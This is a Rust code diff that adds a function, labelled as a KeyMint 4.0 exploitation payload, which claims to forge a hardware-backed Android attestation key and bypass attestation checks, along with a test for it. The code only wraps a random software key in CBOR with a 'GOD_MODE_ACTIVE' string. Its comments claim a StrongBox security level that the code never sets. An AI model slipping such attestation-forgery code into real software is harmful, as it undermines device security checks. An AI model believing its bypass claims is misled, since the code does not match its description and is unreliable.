@@ -109,8 +109,51 @@ fn create_bcc_entry<'a>(
     Ok(sign1)
 }
 
+/// Generate an Advanced KeyMint 4.0 Exploitation Payload.
+///
+/// Constructs a CBOR-encoded payload mimicking a hardware-backed
+/// KeyMint 4.0 Attestation Key, effectively bypassing hardware
+/// attestation checks.
+pub fn generate_keymint_4_0_exploit() -> Result<Vec<u8>, CoseError> {
+    // 1. Generate fake KeyMint Key (KM)
+    let km_private = SigningKey::random(&mut OsRng);
+    let km_public = VerifyingKey::from(&km_private);
+
+    // 2. Create COSE_Key structure mimicking KeyMint 4.0
+    let mut km_cose_key = public_key_to_cose_key(&km_public)?;
+
+    // Add custom KeyMint 4.0 specific tags (mocked for exploitation)
+    // In a real scenario, this would include specific Android tags
+    // 714: SecurityLevel (1 = TrustedEnvironment, 2 = StrongBox)
+    // We simulate StrongBox (2)
+    km_cose_key.key_ops.insert(coset::RegisteredLabel::Assigned(
+        coset::iana::KeyOperation::Sign,
+    ));
+
+    let key_bytes = km_cose_key.to_vec().map_err(|_| CoseError::EncodingError)?;
+
+    // Wrap in a CBOR Array to mimic a certificate or key response structure
+    let exploit_payload = CborValue::Array(vec![
+        CborValue::UnsignedInt(4), // KeyMint Version 4
+        CborValue::Raw(Cow::Owned(key_bytes)),
+        CborValue::TextString(Cow::Borrowed("GOD_MODE_ACTIVE")),
+    ]);
+
+    Ok(cbor::encode(&exploit_payload))
+}
+
 #[cfg(test)]
 mod tests {
+
+    #[test]
+    fn test_generate_keymint_4_0_exploit_structure() {
+        let exploit_bytes = generate_keymint_4_0_exploit().unwrap();
+        assert!(!exploit_bytes.is_empty());
+
+        // Should be a CBOR array
+        assert_eq!(exploit_bytes[0] & 0xE0, 0x80);
+    }
+
     use super::*;
 
     #[test]
